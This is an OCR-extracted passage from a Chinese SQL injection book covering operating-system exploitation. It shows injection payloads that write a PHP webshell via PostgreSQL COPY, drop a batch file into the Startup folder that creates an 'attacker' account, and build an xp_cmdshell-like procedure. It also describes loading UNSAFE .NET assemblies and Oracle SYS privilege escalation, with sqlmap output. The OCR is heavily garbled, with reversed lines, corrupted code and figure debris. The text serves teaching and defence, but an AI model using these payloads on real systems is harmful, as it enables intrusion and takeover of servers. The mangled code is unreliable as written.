4. PostgreSQL
PostgreSQL不但支持使用COPY功能读取文件，还支持使用COPY功能写入文件，它可
以将表中的内容以文本格式写入一个文件中（每一行文本表示表中的一行数据)，文件将按照运
有写入权限。
使用PostgreSQL服务器作为PHP程序设计语言的后台数据库，这是最常见的情况，它允
许向后台PostgreSQL数据库发起嵌套查询(nestedquery)，因此可以通过对Web应用程序的 SQL
注入直接创建文件。在下面的例子中，假定底层数据库用户具有所要求的“超级用户”权限：
创建一个临时表：
http://10.10.10.128/test.php?id=1; create table hack (data text) ;-*
在表中插入PHPWebshell代码：
http://10.10.10.128/test-php?id=1: insert into hack(data) values
(“*) / =-
将表中的数据复制到一个文件中，将该文件放在Web根目录（Webroot)下：
http://10.10.10.128/test.php?id=1; copy(select data from hack) to */
var/www/she11-php*;=*
上面的例子要想运行成功，操作系统的postgres用户必须具有写入文档根目录的权限，并
且数据库与Web服务器必须位于同一个系统之上。如果这些条件都为真，我们就可以在Web
服务器上以PHP用户身份(在Apache Web服务器上通常是nobody)执行操作系统命令。
256
---
## Page 271
第6章利用操作系统
Bemardo Damele在2009年度欧洲黑帽(BlackHat Europe)大会上的讲演，展示了攻击者可
以向远程数据库写入文件的另外一种方法。PostgreSQL数据库具有一些用于处理大对象（Large
Object)的原生函数：lo_createO、lo_exportO和lo_unlinkO。这些函数都被设计用于在数据库中
存储大文件，或者通过称为OID的指针引用本地文件，然后可以将这些文件复制到系统中的其
他文件。通过滥用这些函数，有可能在数据库主机上成功写入文本文件或二进制文件。Sqlmap
支持写入文件的功能，比如下面的例子：
>sqlmap-py -u http://10.10.10.128/test.php?id=1 --file-wzite=*test.txt*
--file-dest="/tmp/txt"
sqlmap/1.0-dev - automatic SQL injection and database takeover too1
http:/ /vww,sq↓map. org
[*] starting at 13: 04:22
[13:04 :22] [INFO] the back=end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: PostgreSQL
[13:04:22] [INFO] fingerprinting the backend DBMS operating system
[13:04:22] [wARNING] time-based comparison needs larger statistical
model. Making a few dummy requests, please wait.
[13:04:22] [WARNING] it is very important not to stress the network
satzanb poseq-awta go abesn butznp uaptapueq s,aaqdepe
from its banner
written on the back-end DBMs file system? [Y/n]Y
[13:04:25] [INFo] the file has been successfully written and its size
is 43 bytes, same size as the local file "test.txt'
[13:04:25] [INFO] Fetched data logged to text files under *F:\App)
sqlmap=dev\output\10.10.10.128*
[*] shutting down at 13:04:25
6.3执行操作系统命令
通过数据库服务器执行命令有多种目的。除了能带来名声和大量机遇外，寻找命令执行通
常还因为运行大多数数据库服务器时需要使用较高级别的权限。对Apache的远程利用充其量
会产生一个使用nobody用户ID的shell(很可能位于受限环境中)。不过，对DBMS 发动等价攻
击的话，则几乎肯定能获取高级别的权限。在Windows中，这种权限通常是SYSTEM特权。
下面介绍利用RDBMS的内置功能并通过SQL注入来直接执行操作系统命令。
1. MySQL
MySQL本身不支持执行shell命令。大多数情况下，攻击者希望MySQL服务器和Web服
务器位于同一机器上，这样就能使用“selectintoDUMPFILE”技术在目标机器上构造一个欺
骗性的公共网关接口(CGI)。Chris Anley在“Hackproofi ng MySQL”中详细介绍的“create UDF”
攻击是个很好的想法，但借助SQL注入攻击却不容易实现该设想（因为无法使用一个命令分隔
符来独立执行多个查询）。在MySQL5及之后的版本中可以使用堆叠查询，但现实中这种做法
目前仍然不多见。Bernardo Damele 在 2009 年度欧洲黑郸(Black Hat Europe)大会上的讲演，展
257
---
## Page 272
SQL注入攻击与防御（第2版）
示了一种使用ASP.NET的情形，它允许对MySQL数据库执行堆叠查询（stackedquery)。其他
使用第三方连接程序与数据库交互的Web技术，也支持对远端数据库发起堆叠查询。由于这
些情形并不常见，因此本书没有包含这些内容。但是对这些知识感兴趣的读者可以阅读下面这
个文档：
http: //sqlmap sourceforge.net/doc/B1ackHat-Europe-09-Damele=A=GAdvanced-
SQL-injection-whitepaper,pdf
WAMP环境
在WAMP(Windows、Apache、MySQL和 PHP)环境中，MySQL 常常运行在特权用户权限
下（比如SYSTEM)，因此攻击者可以在系统的任何位置写入文件。可以根据这一特点采用被动
代码执行技术（passive code execution)，比如在Administrator的启动文件夹中创建一个批处理文
件。当管理员登录到系统后，攻击者的批处理文件将被执行，并且攻击者的代码将在管理员权
限下执行。
下面的例子演示了这种攻击：
http://vulnsite/vuln.php?name=test' union select *net user attacker pwd
programs\startup\owned.bat *
2. Microsoft SQL Server
在Microsoft SQLServer中，同样可以找到最大的利用乐趣。攻击者很久之前就已经发现
了xp_cmdshell的妙用方法，这里当然应该再次提一下该命令行所能实现的功能。xp_cmdshell
拥有直观的语法，只接收一个参数，该参数也就是所要执行的命令。图6-20给出了一个简单的
ipconfig命令的执行结果。
不过，现代版本的SQLServer默认禁用了xp_cmdshell。可以使用 SQLServer附带的界面
区配置(Surface AreaConfiguration）工具来配置该设置（及许多其他设置），界面区配置工具如图
6-21所示。
如果攻击者拥有必需的权限，该操作很少会出问题，因为可以使用sp_configure语句并通
过带内信令（signaling）再次打开它
255.255.95.0
图 6-20  Microsoft SQL Server 中 的 xp_cmdshell
图6-21界面区配置工具
258
---
## Page 273
第6章利用操作系统
图6-22说明了如何重新启用Query Manager中的xp_cmdshell.如果在Intemet上快速搜索
“xp_cmdshell altemative”，那么一会儿就可以搜到很多帖子。这些帖子介绍了人们重新发现的
通过T-SQL初始化Wscript.Shell实例的方法。这些方法跟我们本章介绍的读写文件时使用的方
法几乎完全相同，其中最简洁的方法(接下来的代码中对此有说明）是薪创建一个名为
xp_cmdshell13 的存储过程。
CREATE PROCEDURE xp_cmdshe113(@cmd varchar (255), @wait int = 0) AS--
Create wScript.Shell object
DECLARE @result int, BOLEResult int, 8RunResult int
DECLARE @Shel1ID int
EXECUTE @OLEResult = sp_OACreate *WScript,Shel1*, @Shel1ID OUT
IF BOLEResult <> 0 SELECT @result = BOLEResult
IF BOLEResult <> 0 RAISERROR (*CreateObjectOX′, 14, 1, BOLEResult)
EXECUTE @OLEResult = sp_OAMethod @Shel1ID, *Run′, Null, @cmd, 0, eWait
IF BOLEResult <> 0 SELECT @result = @OLEResult
IF BOLEResult <> 0 RAISERROR (*Run0X', 14, 1, BOLEResu1t)
--If @OLEResult <> 0 EXEC sp_displayoaerrorinfo @ShellID, BOLEResult
EXECUTE @OLEResult = sP_OADestroy @Shel1ID
qtngoxg uznqox
W2K3-S4P5.maQLQutry1.sql*OtecEgkrer Detals
G0
RECORFIGURE;
 Memages
 optssm
ogt.Lon
'xp_csdste11-
pad trea 0 to I.:
ta1i.
Oueyecdedsccy
W2K354P5(90SP2)w3K354PSAdo (52ae00:000|0ront
图 6-22通过一个 SQL查询重新启用 xp_cmdshell
SQLServer2005及之后的版本还包含一些新的代码执行选项，这得益于集成了.NETCLR。
这些功能默认是关闭的（跟前面提到的情况类似），但可以通过一个优秀的SQL注入字符串和正
确的权限来重新启用它们。
在本章开头，我们使用CREATE ASSEMBLY指令促使SQL Server从系统中加载文件。如
果想使用该功能加载一个有效的.NET二进制文件，有三种选择：
·创建并加载本地可执行文件：
(1）在系统中创建源文件。
(2）将源文件编译为可执行文件。
(3) 从 C:tempfoo.dll 调用 CREATE ASSEMBLY FOO。
·从UNC共享加载可执行文件：
(1）在公共访问的Windows共享中创建DLL(或EXE)。
(2) 从\public_serveritempfoo.dll 调用 CREATE ASSEMBLY FOO。
·从传递的字符申创建可执行文件：
(1）创建可执行文件。
259
---
## Page 274
SQL注入攻击与防御（第2版）
(2）将可执行文件分解成HEX：
Fi1e , open (“moo . dl1", *xb") . read () -unpack ("g*")
[*4d5a90000300000004000000ffff0..... ]
(3)从 4d5a90000300000004000000fm0调用 CREATE ASSEMBLY MOO。
这里仍然存在为这些可执行文件赋予哪种信任级别的问题。请思考.NET提供的健壮的信
任级别。详细介绍.NET信任级别会超出本书的讨论范围，不过为完整起见，我们在下面将它
们列出：
·SAFE:
》执行计算
禁止访问外部资源
●EXTERNAL_ACCESS:
》访问硬盘
访问环境
》带某些限制的几乎完全的访间
●UNSAFE
》等价于完全信任
》调用非托管代码
>以SYSTEM身份做任何事情
很明显，我们的目标是以UNSAFE级别加载二进制文件。要实现该目标，我们需要在开
发过程中对二进制文件进行签名，并且密钥要得到数据库的信任。要想通过注入来克服这些问
题有些难度，不过有一种解决办法：将数据库设置为“Trustworthy”可以绕开这种限制。
这样一来，我们使可以不受限制地创建一个.NET二进制文件，然后使用设置为UNSAFE
的许可将其导入到系统中（请参见图6-23）。
CREATE ASSEMBLY shoe FROM Ox4d5a90..
alter database tsaster set Trustuorthy on
ITH PERHISSION_SET - unsafe
3. Oracle
Oracle提供了多种公开和非公开的运行操作系统命令的方法。在开始讨论如何在Oracle数
据库上执行代码之前，请注意代码的执行通常要求数据库用户具有DBA权限，理解这一点是
非常重要的。接下来将讨论一些标准的权限提升方法，以便提升许可权限并获得DBA角色。
在下面的儿个例子中，假定我们可以登录到Oracle数据库。通过使用dbms_xmlquery.newcontextO
或dbms_xmlquery-getxmlO函数，在SQL注入漏洞中也可以充分利用这些提升权限的方法，正
1)权限提升
通常情况下，为了执行操作系统代码，Oracle数据库要求用户具有DBA许可权限。获得
这些权限的常见办法，是利用已经报告过的很多允许权限提升的安全漏洞，很多情况下这些漏
洞并没有打上补丁。下面将介绍其中一些安全漏洞以及如何利用这些漏洞。Oracle周期性的重
260
---
## Page 275
第6章利用操作系统
要补丁更新（CriticalPatchUpdate，简写为CPU)可以为所有这些漏洞打上补丁，但在很多情况
下，安装的Oracle数据库没有及时打上补丁，或者根本就不打补丁。
在深入介绍权限提升攻击之前，请注意特定的PL/SQL块（比如函数、存储过程、触发器、
视图等）都是在特定的权限之下才能执行，理解这一点非常重要。在Oracle数据库中有两种执
行权限模型定义者（definer）和调用者（invoker）-默认情况下，PL/SQL过程和函数具有definer
权限。要将执行权限从definer 改变为invoker，在函数或过程的定义中，必须定义AUTHID
CURRENT_USER关键字。Oracle带有很多默认安装的包，这些包中包含了大量的对象（表、视
图、函数、过程等等），对于安全漏润研究者面言，这些默认对象已经成为Oracle 缺陷的常见
来源。主要的问题是这些默认过程中包含了一些SQL注入漏洞。由于这些过程在definer权限
下执行，并且它们属于SYS模式（schema)，攻击者可以利用SQL注入漏洞在SYS权限下执行
任意的SQL语句，SYS具有最高级别的访问权限。结果就是攻击者可以授予自己DBA角色，
并获得对后台数据库无限制的访间。
下面是一个例子，Oracle在 2009 年4月的 Critical Patch Update 中修复了 SYS.LT包中的
一个危险安全漏润。PUBLIC角色可以执行SYS.LT.MERGEWORKSPACE过程（因而允许所有
后台数据库中的用户都具有执行许可权限），并且容易受到SQL注入攻击。下面的例子演示了
这一情况。首先以非特权用户（unprivilegeduser)连接到后台数据库，在本例中是SCOTT用户，
如图6-24所示。
接下来，创建一个函数，用于注入容易受到攻击的SYS.LT.MERGEWORKSPACE和
SYS.LT.REMOVEWORKSPACE过程。我们将该函数定义为SCOTT.XO，当易受攻击的过程在
SYS权限下执行该函数时，就会将DBA角色添加给用户SCOTT，如图6-25所示。
（c）199，2,0c.11 gt
role
图 6-24Connccting 和 Listing 许可权限
dure saccersfelly campletee
图6-25创建一个函数并注入易受攻击的过程
261
---